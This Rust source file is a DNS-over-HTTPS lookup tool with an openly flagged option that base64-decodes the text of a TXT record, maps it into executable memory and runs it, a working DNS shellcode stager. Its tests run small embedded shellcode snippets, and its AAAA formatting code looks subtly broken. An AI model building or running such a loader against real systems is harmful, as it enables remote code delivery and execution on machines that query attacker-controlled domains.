use std::{collections::HashMap, io::Cursor};

use dns_util::{
    http::{Client, DnsRequest, HttpMethod, Request},
    DnsPacket, FromBytes, RecordType, ToBytes,
};
// use reqwest::Client;
use structopt::StructOpt;

#[derive(StructOpt)]
struct CliArgs {
    #[structopt(short = "r", long = "record-type", help = "which record type")]
    record_type: String,
    #[structopt(help = "domain name to lookup")]
    domain: String,
    #[structopt(
        short = "d",
        long = "dns-host",
        help = "dns host to use",
        default_value = "https://dns.google/dns-query"
    )]
    dns_host: String,

    #[structopt(
        short = "e",
        long = "execute-shellcode",
        help = "execute shell code from txt"
    )]
    exec_shellcode: bool,
}
#[tokio::main]
async fn main() {
    let args = CliArgs::from_args();
    let record_type = match args.record_type.as_str() {
        "*" | "any" | "ANY" => RecordType::ANY,
        "a" | "A" => RecordType::A(0),
        "aaaa" | "AAAA" => RecordType::AAAA(0),
        "txt" | "TXT" => RecordType::TXT(String::new()),
        "cname" | "CNAME" => RecordType::CNAME(String::new()),
        "mx" | "MX" => RecordType::MX(String::new()),
        _ => unimplemented!("Not implemented"),
    };
    let pkg = DnsPacket::builder()
        .add_query(args.domain.as_str(), record_type)
        .build();

    let client = Client::new();

    //  Use DNS over TLS
    // let response_package = dns_over_tls(pkg, client).await;

    // Use DNS over HTTPS
    let response_package = dns_over_https(pkg, &args, client).await;

    println!("---- DNS ----");
    println!("---- QUERY ----");
    println!("{:?}", response_package.queries[0]);
    println!("------");
    println!("---- ANSWERS ----");

    let mut shellcode = String::new();

    for answer in &response_package.answers {
        if let Ok(RecordType::A(ip)) = answer.get_record_type() {
            if answer.class == 1 {
                println!(
                    "A\t{}\tIN\t{}.{}.{}.{}",
                    answer.ttl,
                    (ip & 0xff_00_00_00) >> 24,
                    (ip & 0x00_ff_00_00) >> 16,
                    (ip & 0x00_00_ff_00) >> 8,
                    ip & 0x00_00_00_ff
                );
            }
        }
        if let Ok(RecordType::AAAA(ip)) = answer.get_record_type() {
            if answer.class == 1 {
                println!(
                    "AAAA\t{}\tIN\t{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}:{:02x}",
                    answer.ttl,
                    (ip & 0xff_00_00_00) >> 48,
                    (ip & 0x00_ff_00_00) >> 40,
                    (ip & 0x00_00_ff_00) >> 32,
                    ip & 0x00_00_00_ff,
                    (ip & 0xff_00_00_00) >> 24,
                    (ip & 0x00_ff_00_00) >> 16,
                    (ip & 0x00_00_ff_00) >> 8,
                    ip & 0x00_00_00_ff
                );
            }
        }

        if let Ok(RecordType::TXT(txt)) = answer.get_record_type() {
            if answer.class == 1 {
                println!("TXT\t{}\tIN\t{}", answer.ttl, txt);
                shellcode = txt;
            }
        }
        if let Ok(RecordType::CNAME(cname)) = answer.get_record_type() {
            if answer.class == 1 {
                println!("CNAME\t{}\tIN\t{}", answer.ttl, cname);
            }
        }
        if let Ok(RecordType::NS(ns)) = answer.get_record_type() {
            if answer.class == 1 {
                println!("NS\t{}\tIN\t{}", answer.ttl, ns);
            }
        }
        if let Ok(RecordType::MX(mx)) = answer.get_record_type() {
            if answer.class == 1 {
                println!("MX\t{}\tIN\t{}", answer.ttl, mx);
            }
        }
    }

    if args.exec_shellcode {
        println!(
            "\n\n---- Running shell code {} from TXT record ----",
            shellcode
        );
        unsafe {
            run(&shellcode);
        }
    }
}

async fn dns_over_tls(pkg: DnsPacket, mut client: Client) -> DnsPacket {
    let request =
        DnsRequest::new_with_host("cloudflare-dns.com", "1.1.1.1:853".parse().unwrap(), pkg);
    let response_package = client.send_dot(request).await.unwrap();
    response_package
}

async fn dns_over_https(pkg: DnsPacket, args: &CliArgs, mut client: Client) -> DnsPacket {
    let dns_package = base64::encode_config(&pkg.to_vec().unwrap(), base64::URL_SAFE_NO_PAD);
    let mut headers = HashMap::new();
    headers.insert("accept".to_string(), "application/dns-message".to_string());
    headers.insert(
        "content-type".to_string(),
        "application/dns-message".to_string(),
    );
    let request = Request::new(
        format!("{}?dns={}", args.dns_host, dns_package)
            .parse()
            .unwrap(),
        HttpMethod::Get,
        headers,
        vec![],
    );
    let dns_response = client.send(request).await.unwrap().body;
    let response_package =
    DnsPacket::read(&mut Cursor::new(&dns_response)).expect("response was invalid");
    response_package
}

use mmap::{
    MapOption::{MapExecutable, MapReadable, MapWritable},
    MemoryMap,
};

use std::mem;

unsafe fn run(shell_code: &str) {
    let shell_code = base64::decode(shell_code).unwrap();
    let mem_map =
        MemoryMap::new(shell_code.len(), &[MapReadable, MapWritable, MapExecutable]).unwrap();
    println!("virtual_code_address = {:?}", mem_map.data());

    std::ptr::copy(shell_code.as_ptr(), mem_map.data(), shell_code.len());

    let asm_func: extern "C" fn() -> u32 = mem::transmute(mem_map.data());

    let out = asm_func();

    println!("out is {}", out);
}

#[cfg(test)]
mod test {
    use super::*;
    #[test]
    fn test_shellcode() {
        let code = "VUiJ5UiNNRQAAABqAVhqDFpIiccPBWo8WDH/DwVdww==";
        unsafe { run(code) };
    }
    #[test]
    fn test_rust_shell_code() {
        let code =
            "VUiJ5Ugx21NIuHJsZCEKAAAAUEi4SGVsbG8gd29QuAQAAAJIjTQkSMfHAQAAAEjHwg4AAAAPBVhYWF3D";
        unsafe { run(code) };
    }
}
